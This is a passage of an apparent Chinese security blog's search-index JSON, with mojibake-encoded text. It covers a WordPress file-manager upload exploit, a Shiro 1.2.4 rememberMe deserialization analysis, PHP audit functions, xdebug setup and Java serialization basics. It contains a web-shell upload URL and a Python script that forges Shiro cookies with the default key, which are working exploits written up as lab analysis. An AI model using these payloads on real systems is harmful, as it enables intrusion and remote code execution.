ç”Ÿæˆçš„æ–‡ä»¶å†…ã€‚ http://wordpress.test/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php?cmd=put&amp;target=l1_dGVzdC5waHA=&amp;content=&lt;?php eval($_GET['cmd']);?&gt; å‰ä¸€éƒ¨åˆ†ä¸åœ¨è¯¦è¿°ï¼Œç›´æ¥è·Ÿåˆ° $result = $this-&gt;$cmd($args); è°ƒç”¨ put æ–¹æ³• \\elFinder::put \\elFinderVolumeDriver::putContents \\elFinderVolumeDriver::decodedecode å‡½æ•° å…ˆå°†$hash çš„å€¼æ ¹æ® $this-&gt;id è¿›è¡Œåˆ†å‰²ï¼Œç„¶åæ›¿æ¢å­—ä¸²å¹¶è¿›è¡Œ base64 è§£ç  ç„¶åæ‹¼æ¥ æ‰€å¯¹åº”çš„ $this-&gt;root æœ€åä¼šè¿”å› $path çš„å€¼ä¸ºE:\\Tools\\phpstudy_pro\\WWW\\wordpress\\wp-content\\plugins\\wp-file-manager\\lib\\files\\test.php\\elFinderVolumeLocalFileSystem::_filePutContents æˆåŠŸå°†å­—ç¬¦ä¸²å†™å…¥æ–‡ä»¶ä¸­ æˆåŠŸåˆ©ç”¨è¿˜å¯ä»¥ç›´æ¥åˆ©ç”¨ upload æ–¹æ³•ï¼Œä¸Šä¼ æ–‡ä»¶ \\elFinder::upload å‚è€ƒæ–‡ç«  Wordpress file manageræ’ä»¶ä»»æ„æ–‡ä»¶ä¸Šä¼ WordPressæ–‡ä»¶ç®¡ç†å™¨æ’ä»¶0dayæ¼æ´è§£æ document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]},{"title":"Apache Shiro 1.2.4ååºåˆ—åŒ–æ¼æ´","slug":"Apache Shiro 1.2.4ååºåˆ—åŒ–æ¼æ´","date":"2020-08-31T06:37:52.000Z","updated":"2020-10-12T06:10:55.186Z","comments":true,"path":"2020/08/31/Apache Shiro 1.2.4ååºåˆ—åŒ–æ¼æ´/","link":"","permalink":"http://yoursite.com/2020/08/31/Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/","excerpt":"æ¼æ´ç®€ä»‹ Apache Shiro æ˜¯ä¸€æ¬¾å¼€æºå®‰å…¨æ¡†æ¶ï¼Œæä¾›èº«ä»½éªŒè¯ã€æˆæƒã€å¯†ç å­¦å’Œä¼šè¯ç®¡ç†ã€‚Shiroæ¡†æ¶ç›´è§‚ã€æ˜“ç”¨ï¼ŒåŒæ—¶ä¹Ÿèƒ½æä¾›å¥å£®çš„å®‰å…¨æ€§ã€‚Apache Shiro 1.2.4åŠä»¥å‰ç‰ˆæœ¬ä¸­ï¼ŒåŠ å¯†çš„ç”¨æˆ·ä¿¡æ¯åºåˆ—åŒ–åå­˜å‚¨åœ¨åä¸º RememberMe çš„ Cookie ä¸­ã€‚æ”»å‡»è€…å¯ä»¥ä½¿ç”¨ Shiro çš„é»˜è®¤å¯†é’¥ä¼ªé€ ç”¨æˆ· Cookieï¼Œè§¦å‘Javaååºåˆ—åŒ–æ¼æ´ï¼Œè¿›è€Œåœ¨ç›®æ ‡æœºå™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚","text":"æ¼æ´ç®€ä»‹ Apache Shiro æ˜¯ä¸€æ¬¾å¼€æºå®‰å…¨æ¡†æ¶ï¼Œæä¾›èº«ä»½éªŒè¯ã€æˆæƒã€å¯†ç å­¦å’Œä¼šè¯ç®¡ç†ã€‚Shiroæ¡†æ¶ç›´è§‚ã€æ˜“ç”¨ï¼ŒåŒæ—¶ä¹Ÿèƒ½æä¾›å¥å£®çš„å®‰å…¨æ€§ã€‚Apache Shiro 1.2.4åŠä»¥å‰ç‰ˆæœ¬ä¸­ï¼ŒåŠ å¯†çš„ç”¨æˆ·ä¿¡æ¯åºåˆ—åŒ–åå­˜å‚¨åœ¨åä¸º RememberMe çš„ Cookie ä¸­ã€‚æ”»å‡»è€…å¯ä»¥ä½¿ç”¨ Shiro çš„é»˜è®¤å¯†é’¥ä¼ªé€ ç”¨æˆ· Cookieï¼Œè§¦å‘Javaååºåˆ—åŒ–æ¼æ´ï¼Œè¿›è€Œåœ¨ç›®æ ‡æœºå™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚ SHIRO-550åœ¨è¯†åˆ«èº«ä»½çš„æ—¶å€™ï¼Œéœ€è¦å¯¹ Cookie é‡Œçš„ RememberMe å­—æ®µè§£å¯†,è§£å¯†çš„é¡ºåºä¸ºï¼š æ£€ç´¢cookieä¸­RememberMeçš„å€¼ Base64è§£ç  ä½¿ç”¨AESè§£å¯† ååºåˆ—åŒ– ä½†æ˜¯ï¼ŒAES åŠ å¯†çš„ç§˜é’¥è¢«ç¡¬ç¼–ç åœ¨ä»£ç é‡Œï¼Œæ¯ä¸ªäººé€šè¿‡æºä»£ç éƒ½å¯ä»¥æ‹¿åˆ° AES åŠ å¯†çš„å¯†é’¥ã€‚æ‰€ä»¥å½“æ”»å‡»è€…å°†æ¶æ„çš„ payload è¿›è¡Œåºåˆ—åŒ–ã€AES åŠ å¯†ã€base64 ç¼–ç ï¼Œä½œä¸º Cookie çš„ RememberMe å­—æ®µå‘é€ã€‚Shiro å°† RememberMe è¿›è¡Œè§£å¯†å¹¶ä¸”ååºåˆ—åŒ–ï¼Œæœ€ç»ˆé€ æˆååºåˆ—åŒ–æ¼æ´ã€‚ æ¼æ´åˆ†æ è·å– Apache Shiro å­˜åœ¨æ¼æ´çš„æºä»£ç  123git clone https://github.com/apache/shiro.git cd shiro git checkout shiro-root-1.2.4 ä¿®æ”¹ /shiro/samples/web/pom.xml 123456789101112&lt;dependency&gt; &lt;groupId&gt;javax.servlet&lt;/groupId&gt; &lt;artifactId&gt;jstl&lt;/artifactId&gt; &lt;version&gt;1.2&lt;/version&gt; &lt;scope&gt;runtime&lt;/scope&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;taglibs&lt;/groupId&gt; &lt;artifactId&gt;standard&lt;/artifactId&gt; &lt;version&gt;1.1.2&lt;/version&gt; &lt;scope&gt;runtime&lt;/scope&gt;&lt;/dependency&gt; ç„¶åç”¨ideaå¯¼å…¥mvné¡¹ç›® è®¾ç½®run/debug configurationsï¼Œ æ·»åŠ æœ¬åœ°tomcatç¯å¢ƒ åœ¨ org.apache.shiro.mgt.RememberMeManager#onSuccessfulLogin å¤„æ·»åŠ æ–­ç‚¹ï¼Œç„¶ådebug å¼€å¯ tomcat æœåŠ¡ åŠ å¯†è¿‡ç¨‹ ç™»å½•è´¦æˆ·root/secretï¼Œå‹¾é€‰ä¸ŠRemember Meçš„æŒ‰é’®ï¼Œç¨‹åºä¼šåœåœ¨æ–­ç‚¹å¤„ï¼Œç”¨æˆ·åå’Œå¯†ç ä¹Ÿä¼šå­˜å‚¨åœ¨ token ä¸­forgetIdentity é’ˆå¯¹ subject å˜é‡è¿›è¡Œå¤„ç†ï¼Œè·Ÿè¿› forgetIdentity æ–¹æ³•org.apache.shiro.web.mgt.CookieRememberMeManager#forgetIdentity(org.apache.shiro.subject.Subject) è°ƒç”¨ forgetIdentity æ„é€ æ–¹æ³•å¤„ç† request å’Œ reponse è¯·æ±‚org.apache.shiro.web.mgt.CookieRememberMeManager#forgetIdentity(javax.servlet.http.HttpServletRequest, javax.servlet.http.HttpServletResponse) è·Ÿè¿› removeFrom æ–¹æ³•ï¼Œåœ¨ response å“åº”å¤´ä¸­åŠ å…¥äº†ä¸€äº›cookieä¿¡æ¯ã€‚org.apache.shiro.web.servlet.SimpleCookie#removeFrom å›åˆ° onSuccessfulLogin è°ƒç”¨ rememberIdentity ç”Ÿæˆ cookie ä¸­çš„ remember å­—æ®µã€‚è·Ÿè¿› rememberIdentity æ–¹æ³•ã€‚org.apache.shiro.mgt.AbstractRememberMeManager#rememberIdentity(org.apache.shiro.subject.Subject, org.apache.shiro.authc.AuthenticationToken, org.apache.shiro.authc.AuthenticationInfo) é€šè¿‡ getIdentityToRemember è·å–ç”¨æˆ·çš„èº«ä»½ï¼Œç»§ç»­è·Ÿè¿› rememberIdentity æ–¹æ³•ã€‚org.apache.shiro.mgt.AbstractRememberMeManager#rememberIdentity(org.apache.shiro.subject.Subject, org.apache.shiro.subject.PrincipalCollection) è°ƒç”¨ convertPrincipalsToBytes æ–¹æ³•å°† accountPrincipals &lt;â€œrootâ€&gt; è½¬æ¢ä¸ºå­—èŠ‚å½¢å¼ï¼Œè·Ÿè¿› convertPrincipalsToBytes æ–¹æ³•ã€‚org.apache.shiro.mgt.AbstractRememberMeManager#convertPrincipalsToBytes è½¬æ¢è¿‡ç¨‹ä¸­é¦–å…ˆå¯¹ç”¨æˆ·çš„ id è¿›è¡Œåºåˆ—åŒ–ï¼Œç„¶ååˆ©ç”¨ encrypt è¿›è¡ŒåŠ å¯†ã€‚org.apache.shiro.mgt.AbstractRememberMeManager#encrypt åŠ å¯†çš„å¯†é’¥ç”±getEncryptionCipherKey()å¾—åˆ° getEncryptionCipherKey å®é™…ä¸Šæ˜¯å¼€å¤´ä¸­çš„ DEFAULT_CIPHER_KEY_BYTES çš„å¸¸é‡ kPH+bIxk5D2deZiIxcaaaA== å¯†é’¥åˆ†æorg.apache.shiro.mgt.AbstractRememberMeManager#AbstractRememberMeManager org.apache.shiro.mgt.AbstractRememberMeManager#setCipherKey org.apache.shiro.mgt.AbstractRememberMeManager#setEncryptionCipherKey org.apache.shiro.mgt.AbstractRememberMeManager#getEncryptionCipherKey ç»§ç»­å•æ­¥æ‰§è¡Œï¼Œè¿”å› rememberIdentity å‡½æ•° è·Ÿè¿›å‡½æ•° rememberSerializedIdentity org.apache.shiro.web.mgt.CookieRememberMeManager#rememberSerializedIdentityå¯¹å€¼è¿›è¡Œ base64 ç¼–ç ä¹‹åï¼Œè®¾ç½®åˆ° cookie ä¸­ã€‚ å½“æˆ‘ä»¬å‹¾é€‰ RememberMe é€‰é¡¹æ¡†ä¹‹åï¼Œç‚¹å‡»ç™»é™†ä¹‹åï¼Œåç«¯ä¼šè¿›è¡Œå¦‚ä¸‹æ“ä½œã€‚ åºåˆ—åŒ–ç”¨æˆ· id å¯¹ç”¨æˆ· id è¿›è¡Œ AES åŠ å¯†ï¼Œå¯†é’¥ä¸ºå¸¸é‡ base64 ç¼–ç  è®¾ç½®åˆ° cookie ä¸­çš„ rememberme å­—æ®µ è§£å¯†è¿‡ç¨‹ åœ¨ org.apache.shiro.mgt.DefaultSecurityManager#getRememberedIdentity æ·»åŠ æ–­ç‚¹ï¼Œç„¶åå‘é€ä¸€ä¸ªå¸¦æœ‰ readmemberMe cookieçš„è¯·æ±‚ã€‚ è·Ÿè¿›å‡½æ•° getRememberedPrincipalsorg.apache.shiro.mgt.AbstractRememberMeManager#getRememberedPrincipals è°ƒç”¨ getRememberedSerializedIdentity é’ˆå¯¹httpè¯·æ±‚è¿›è¡Œå¤„ç†ï¼Œè·Ÿè¿› getRememberedSerializedIdentity org.apache.shiro.web.mgt.CookieRememberMeManager#getRememberedSerializedIdentity getCookie æ„é€ æ–¹æ³•å…ˆè·å– cookie ä¿¡æ¯,readValue æ–¹æ³•ï¼Œæ ¹æ® Cookie ä¸­çš„ name å­—æ®µè·å– Cookie çš„å€¼ï¼Œç„¶åè¿”å› Cookie çš„å€¼ ç„¶åè°ƒç”¨ byte[] decoded = Base64.decode(base64)å¤„ç† base64 åŠ å¯†çš„ Cookie ä¿¡æ¯ï¼Œå¹¶ä¸”å°†è¿™ä¸ª Cookie è½¬åŒ–ä¸ºäºŒè¿›åˆ¶å­—èŠ‚ç  å›åˆ° getRememberedPrincipalsï¼Œç»§ç»­è·Ÿè¿› convertBytesToPrincipals å‡½æ•°org.apache.shiro.mgt.AbstractRememberMeManager#convertBytesToPrincipals AES è§£å¯† org.apache.shiro.mgt.AbstractRememberMeManager#decrypt ååºåˆ—åŒ– org.apache.shiro.mgt.AbstractRememberMeManager#deserializeorg.apache.shiro.io.DefaultSerializer#deserializeçœ‹åˆ° readObject() å½“æˆ‘ä»¬å‘é€å¸¦æœ‰ readmemberMe cookieçš„è¯·æ±‚ï¼Œåç«¯ä¼šè¿›è¡Œå¦‚ä¸‹æ“ä½œã€‚ è¯»å– cookie ä¸­ rememberMe çš„å€¼ base64 è§£ç  è¿›è¡Œ AES è§£å¯†ï¼Œå¯†é’¥ä¸ºå¸¸é‡ ååºåˆ—åŒ– 123456789101112131415161718192021222324252627282930#!/usr/bin/env python3# coding:utf-8from Crypto.Cipher import AESimport tracebackimport requestsimport subprocessimport uuidimport base64target = \"http://localhost:8080/samples_web_war/\"jar_file = 'F:\\\\Penetration\\\\ysoserial\\\\ysoserial-0.0.6-SNAPSHOT-all.jar'cipher_key = \"kPH+bIxk5D2deZiIxcaaaA==\"# åˆ›å»º remembermeçš„å€¼popen = subprocess.Popen(['java','-jar',jar_file, \"URLDNS\", \"http://7zhfmm.dnslog.cn\"], stdout=subprocess.PIPE)BS = AES.block_sizepad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()mode = AES.MODE_CBCiv = uuid.uuid4().bytesencryptor = AES.new(base64.b64decode(cipher_key), mode, iv)file_body = pad(popen.stdout.read())base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))# å‘é€requesttry: r = requests.get(target, cookies={'rememberMe':base64_ciphertext.decode()}, timeout=10)except: traceback.print_exc() æ¼æ´åˆ©ç”¨ commons-collections 3.2.1 shiroè‡ªå¸¦çš„commons-collections-3.2.1 ã€commons-beanutils-1.8.3 åœ¨JDK1.8u112ä¸­ï¼Œå¯ä»¥ç›´æ¥åˆ©ç”¨ ysoserial ä¸­çš„Commons-Collections5ï¼ˆ3.1-3.2.1ï¼Œjdk1.8ï¼‰ 1java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections5 \"clac\" ä¼šæŠ¥é”™æç¤º org.apache.shiro.io.SerializationException: Unable to deserialze argument byte array. å›åˆ° org.apache.shiro.io.DefaultSerializer#deserialize æˆ‘ä»¬å‘ç°åœ¨è¿™é‡Œä½¿ç”¨äº† ClassResolvingObjectInputStream ç±»è€Œéä¼ ç»Ÿçš„ ObjectInputStream org.apache.shiro.io.ClassResolvingObjectInputStream#resolveClass java.io.ObjectInputStream#resolveClass ObjectInputStream çš„ resolveClass å‡½æ•°ç”¨çš„æ˜¯Class.forName ç±»è·å–å½“å‰æè¿°å™¨æ‰€æŒ‡ä»£çš„ç±»çš„Classå¯¹è±¡ shiro ä¸­ ClassResolvingObjectInputStream ç»§æ‰¿äº† ObjectInputStreamï¼ŒresolveClass è¢«é‡å†™ï¼Œè°ƒç”¨äº† ClassUtils.forName è·å–å½“å‰æè¿°å™¨æ‰€æŒ‡ä»£çš„ç±»çš„Classå¯¹è±¡ org.apache.shiro.util.ClassUtils#forName çœ‹ä¸€ä¸‹ ExceptionIgnoringAccessor æ˜¯å¦‚ä½•æ˜¯å®ç°çš„org.apache.shiro.util.ClassUtils.ExceptionIgnoringAccessor commons-collections 4.0 å‚è€ƒæ–‡ç«  Apache Shiro Javaååºåˆ—åŒ–æ¼æ´åˆ†æShiro 1.2.4 RememberMeååºåˆ—åŒ–æ¼æ´è¸©å‘åˆ†æ(CVE-2016-4437)Pwn a CTF Platform with Java JRMP Gadget document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]},{"title":"ç›¸å…³å‡½æ•°æ€»ç»“","slug":"ç›¸å…³å‡½æ•°æ€»ç»“","date":"2020-08-20T13:31:50.000Z","updated":"2020-10-12T06:10:55.191Z","comments":true,"path":"2020/08/20/ç›¸å…³å‡½æ•°æ€»ç»“/","link":"","permalink":"http://yoursite.com/2020/08/20/%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0%E6%80%BB%E7%BB%93/","excerpt":"PHP ç›¸å…³å‡½æ•°","text":"PHP ç›¸å…³å‡½æ•° å®¡è®¡åˆ©ç”¨å‡½æ•° var_dump() var_dump() å‡½æ•°ç”¨äºè¾“å‡ºå˜é‡çš„ç›¸å…³ä¿¡æ¯ã€‚ ä»»æ„æ–‡ä»¶ä¸‹è½½ fread() fread() å‡½æ•°è¯»å–æ–‡ä»¶ï¼ˆå¯å®‰å…¨ç”¨äºäºŒè¿›åˆ¶æ–‡ä»¶ï¼‰fread(file,length) å‚æ•° æè¿° file å¿…éœ€ã€‚è§„å®šè¦è¯»å–æ‰“å¼€æ–‡ä»¶ã€‚ length å¿…éœ€ã€‚è§„å®šè¦è¯»å–çš„æœ€å¤§å­—èŠ‚æ•°ã€‚ 123456789101112131415$path = \"../{$file}\";$handle = fopen($path, \"r\");header(\"Pragma: \");header(\"Cache-Control: \");header(\"Content-type: application/octet-stream; charset=utf-8\");header(\"Content-Disposition: attachment; filename=\\\"{$name}\\\"\");if ($handle) { while (!feof($handle)) { $read = fread($handle, 4096); print($read); }}pclose($handle); å˜é‡è¦†ç›– extrat() extract() ä»æ•°ç»„ä¸­å°†å˜é‡å¯¼å…¥åˆ°å½“å‰çš„ç¬¦å·è¡¨ å‘½ä»¤æ‰§è¡Œ call_user_func_array() call_user_func_array(â€œsystemâ€,[â€œwhoamiâ€]); document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]},{"title":"phpstormè¿›è¡ŒPHPæ–­ç‚¹è°ƒè¯•","slug":"phpstormè¿›è¡ŒPHPæ–­ç‚¹è°ƒè¯•","date":"2020-08-20T07:19:41.000Z","updated":"2020-10-12T06:10:55.189Z","comments":true,"path":"2020/08/20/phpstormè¿›è¡ŒPHPæ–­ç‚¹è°ƒè¯•/","link":"","permalink":"http://yoursite.com/2020/08/20/phpstorm%E8%BF%9B%E8%A1%8CPHP%E6%96%AD%E7%82%B9%E8%B0%83%E8%AF%95/","excerpt":"é…ç½®ç¯å¢ƒ phpstromphpstudy","text":"é…ç½®ç¯å¢ƒ phpstromphpstudy phpstrom é…ç½® php ç¯å¢ƒ PHPå®‰è£…xdebugæ‰©å±• æ³¨æ„ç‰ˆæœ¬ï¼šæ­¤æ—¶æˆ‘ä»¬ php çš„ç‰ˆæœ¬ä¸º php5.6.9xdebugæ¨¡å—https://xdebug.org/files/php_xdebug-2.5.5-5.6-vc11-nts-x86_64.dll æŠŠä¸‹è½½æˆåŠŸçš„ php_xdebug-2.5.5-5.6-vc11-nts-x86_64.dllæ”¾åœ¨ E:\\Tools\\phpstudy_pro\\Extensions\\php\\php5.6.9nts\\ext æ–‡ä»¶å¤¹ä¸‹ åŒæ—¶åœ¨ php.ini ä¸­æ·»åŠ å¦‚ä¸‹é…ç½® 12345678910111213[xdebug]zend_extension=\"E:/Tools/phpstudy_pro/Extensions/php/php5.6.9nts/ext/php_xdebug-2.5.5-5.6-vc11-nts-x86_64.dll\" ;æŒ‡å®šXdebugæ‰©å±•æ–‡ä»¶çš„ç»å¯¹è·¯å¾„xdebug.auto_trace=on ;å¯ç”¨ä»£ç è‡ªåŠ¨è·Ÿè¸ªxdebug.collect_params=on ;å…è®¸æ”¶é›†ä¼ é€’ç»™å‡½æ•°çš„å‚æ•°å˜é‡xdebug.collect_return=on ;å…è®¸æ”¶é›†å‡½æ•°è°ƒç”¨çš„è¿”å›å€¼xdebug.trace_output_dir=\"E:/Tools/phpstudy_pro/Extensions/php/tmp/xdebug\" ;æŒ‡å®šå †æ ˆè·Ÿè¸ªæ–‡ä»¶çš„å­˜æ”¾ç›®å½•xdebug.profiler_enable=on ;æ˜¯å¦å¯ç”¨Xdebugçš„æ€§èƒ½åˆ†æï¼Œå¹¶åˆ›å»ºæ€§èƒ½ä¿¡æ¯æ–‡ä»¶xdebug.profiler_output_dir=\"E:/Tools/phpstudy_pro/Extensions/php/tmp/xdebug\" ;æŒ‡å®šæ€§èƒ½åˆ†æä¿¡æ¯æ–‡ä»¶çš„è¾“å‡ºç›®å½•xdebug.remote_enable = on ;æ˜¯å¦å¼€å¯è¿œç¨‹è°ƒè¯•xdebug.remote_handler = dbgp ;æŒ‡å®šè¿œç¨‹è°ƒè¯•çš„å¤„ç†åè®®xdebug.remote_host= localhost ;æŒ‡å®šè¿œç¨‹è°ƒè¯•çš„ä¸»æœºåxdebug.remote_port = 9000 ;æŒ‡å®šè¿œç¨‹è°ƒè¯•çš„ç«¯å£å·xdebug.idekey = PHPSTORM ;æŒ‡å®šä¼ é€’ç»™DBGpè°ƒè¯•å™¨å¤„ç†ç¨‹åºçš„IDE Key PHPStrom é…ç½® debug ç¯å¢ƒ é…ç½® Debug ç«¯å£ é…ç½®IDEKEY é…ç½®Server é…ç½®PHP Web Application æµè§ˆå™¨çš„xdebugæ’ä»¶ æµ‹è¯•è°ƒè¯• åŠ ä¸Šæ–­ç‚¹ï¼ŒåŒæ—¶æŠŠå°ç”µè¯è®¾ç½®æˆä¸ºç»¿è‰²çš„æµè§ˆå™¨ä¸Šçš„æ’ä»¶æ‰“å¼€ï¼ŒåŒæ—¶è®¿é—®è¦è°ƒè¯•çš„é¡µé¢ è°ƒè¯•å•ä¸ªæ–‡ä»¶ è°ƒè¯•å•ä¸ªæ–‡ä»¶æ—¶ é…ç½®PHP Web Applicationç‚¹å‡»ç»¿è‰²çš„å°è™«å­å°±å¯ä»¥è¿›è¡Œè°ƒè¯•äº† å°±å¯ä»¥è¿›è¡Œæ„‰å¿«çš„è°ƒå¼äº†ï¼ åœ¨è¿›è¡Œè°ƒè¯•æ—¶ï¼Œç»å¸¸é‡åˆ°è¿™ä¸ªé—®é¢˜,xdebugæ–­æ‰è°ƒè¯•ç»å¸¸æ— æ•…æ–­å¼€ å¦‚æœé’ˆå¯¹æŸä¸€ä¸ªé¡¹ç›®å¯ä»¥å¯¹é¡¹ç›®çš„é…ç½®æ–‡ä»¶ vhosts.conf ä¸­æ·»åŠ  12IPCConnectTimeout 3000IPCCommTimeout 3000 è¦å¯¹æ‰€æœ‰é¡¹ç›®éƒ½è¿›è¡Œé…ç½®æ—¶ï¼Œå¯ä»¥ä¿®æ”¹httpd.conf document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]},{"title":"åˆè¯†Java ååºåˆ—åŒ–","slug":"åˆè¯†Javaååºåˆ—åŒ–","date":"2020-08-16T13:31:50.000Z","updated":"2020-10-12T06:10:55.190Z","comments":true,"path":"2020/08/16/åˆè¯†Javaååºåˆ—åŒ–/","link":"","permalink":"http://yoursite.com/2020/08/16/%E5%88%9D%E8%AF%86Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","excerpt":"åˆè¯†Java ååºåˆ—åŒ– What ä»€ä¹ˆæ˜¯åºåˆ—åŒ–ä¸ååºåˆ—åŒ– java åºåˆ—åŒ–å¯ä»¥å°†ä¸€ä¸ªå¯¹è±¡åºåˆ—åŒ–æˆJVMè®¤è¯†çš„å­—èŠ‚åºåˆ—ï¼Œå­—èŠ‚åºåˆ—ä¸­åŒ…å«äº†å¯¹è±¡çš„æ•°æ®ï¼Œä¸»è¦ä»¥å¯¹è±¡å±æ€§ä¸ºä¸»ã€‚ java ååºåˆ—åŒ–æ˜¯æŒ‡æŠŠå­—èŠ‚åºåˆ—æ¢å¤ä¸ºjavaå¯¹è±¡çš„è¿‡ç¨‹ã€‚åˆ©ç”¨åœ¨Aå¹³å°ä¸Šåºåˆ—åŒ–äº§ç”Ÿçš„å­—èŠ‚åºåˆ—ï¼Œå¯ä»¥åœ¨Bå¹³å°ä¸Šååºåˆ—åŒ–å‡ºåŒæ ·çš„å¯¹è±¡ã€‚","text":"åˆè¯†Java ååºåˆ—åŒ– What ä»€ä¹ˆæ˜¯åºåˆ—åŒ–ä¸ååºåˆ—åŒ– java åºåˆ—åŒ–å¯ä»¥å°†ä¸€ä¸ªå¯¹è±¡åºåˆ—åŒ–æˆJVMè®¤è¯†çš„å­—èŠ‚åºåˆ—ï¼Œå­—èŠ‚åºåˆ—ä¸­åŒ…å«äº†å¯¹è±¡çš„æ•°æ®ï¼Œä¸»è¦ä»¥å¯¹è±¡å±æ€§ä¸ºä¸»ã€‚ java ååºåˆ—åŒ–æ˜¯æŒ‡æŠŠå­—èŠ‚åºåˆ—æ¢å¤ä¸ºjavaå¯¹è±¡çš„è¿‡ç¨‹ã€‚åˆ©ç”¨åœ¨Aå¹³å°ä¸Šåºåˆ—åŒ–äº§ç”Ÿçš„å­—èŠ‚åºåˆ—ï¼Œå¯ä»¥åœ¨Bå¹³å°ä¸Šååºåˆ—åŒ–å‡ºåŒæ ·çš„å¯¹è±¡ã€‚ Why ä¸ºä»€ä¹ˆè¦ç”¨åºåˆ—åŒ–ä¸ååºåˆ—åŒ– å®ç°äº†æ•°æ®çš„æŒä¹…åŒ–ï¼Œé€šè¿‡åºåˆ—åŒ–å¯ä»¥æŠŠæ•°æ®æ°¸ä¹…çš„ä¿å­˜åœ¨ç¡¬ç›˜ä¸Šã€‚ åˆ©ç”¨åºåˆ—åŒ–å®ç°è¿œç¨‹é€šä¿¡ï¼Œå³åœ¨ç½‘ç»œä¸Šä¼ é€å¯¹è±¡çš„å­—èŠ‚åºåˆ—ã€‚ How å¦‚ä½•å®ç°åºåˆ—åŒ–ä¸ååºåˆ—åŒ– JDKç±»åº“ä¸­åºåˆ—åŒ–API ä½¿ç”¨åˆ°JDKä¸­å…³é”®ç±» ObjectOutputStream(å¯¹è±¡è¾“å‡ºæµ) å’ŒObjectInputStream(å¯¹è±¡è¾“å…¥æµ) ObjectOutputStream ç±»ä¸­ï¼šé€šè¿‡ä½¿ç”¨ writeObject(Object object) æ–¹æ³•ï¼Œå°†å¯¹è±¡ä»¥äºŒè¿›åˆ¶æ ¼å¼è¿›è¡Œå†™å…¥ã€‚ ObjectInputStream ç±»ä¸­ï¼šé€šè¿‡ä½¿ç”¨ readObjectï¼ˆï¼‰æ–¹æ³•ï¼Œä»è¾“å…¥æµä¸­è¯»å–äºŒè¿›åˆ¶æµï¼Œè½¬æ¢æˆå¯¹è±¡ã€‚ åºåˆ—åŒ–ä¸€ä¸ªå¯¹è±¡ è¢«åºåˆ—åŒ–çš„ç±»å¿…é¡»è¦å®ç° Serializable æ¥å£ï¼Œå¦åˆ™å°†æ— æ³•åºåˆ—åŒ–å¯¹è±¡ã€‚ 1234public class User implements Serializable { public String name; public int age;} 12345678910111213141516public class Main { public static void main(String[] args) throws IOException { User user =new User(); user.age = 18; user.name = \"whippet\"; PrintStream out = System.out; ObjectOutputStream objectOutputStream = new ObjectOutputStream(out); objectOutputStream.writeObject(user); objectOutputStream.flush(); objectOutputStream.close(); }} åºåˆ—åŒ–å¯¹è±¡æ—¶ä½¿ç”¨å¯¹è±¡è¾“å‡ºæµâ€ObjectOutputStreamâ€ï¼Œå¾€æŒ‡å®šè¾“å‡ºæµé‡Œå†™å…¥ User å¯¹è±¡ï¼Œä½¿ç”¨æ§åˆ¶å°ï¼Œå¯ä»¥ç›´è§‚çš„çœ‹åˆ°å¯¹è±¡åºåˆ—åŒ–åçš„æ ·å­ã€‚ ï¿½ï¿½ \u0005sr Simple.Userï¿½ï¿½Gm|\u0007X\u001d\u0002 \u0002I \u0003ageL \u0004namet \u0012Ljava/lang/String;xp \u0012t \u0007whippet ååºåˆ—åŒ–å¯¹è±¡ å°†å¯¹è±¡åºåˆ—åŒ–æˆbyteæ•°ç»„ã€‚å†ç”¨â€ObjectInputStreamâ€ååºåˆ—åŒ–å›æ¥ã€‚ 12345678910111213141516171819202122232425262728public class Main { public static void main(String[] args) throws IOException, ClassNotFoundException { User user =new User(); user.age = 18; user.name = \"whippet\"; ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();//ç”¨äºå­˜æ”¾personå¯¹è±¡åºåˆ—åŒ–byteæ•°ç»„çš„è¾“å‡ºæµ ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream); objectOutputStream.writeObject(user);//åºåˆ—åŒ–å¯¹è±¡ objectOutputStream.flush(); objectOutputStream.close(); byte[] bytes = byteArrayOutputStream.toByteArray(); //è¯»å–åºåˆ—åŒ–åçš„å¯¹è±¡byteæ•°ç»„ ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);//å­˜æ”¾byteæ•°ç»„çš„è¾“å…¥æµ ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream); Object o = objectInputStream.readObject(); //å°†byteæ•°ç»„è¾“å…¥æµååºåˆ—åŒ– System.out.println(o); }} è¾“å‡ºè¿™ä¸ªååºåˆ—åŒ–åçš„å¯¹è±¡ï¼Œå’Œä¸€å¼€å§‹ä¸º User 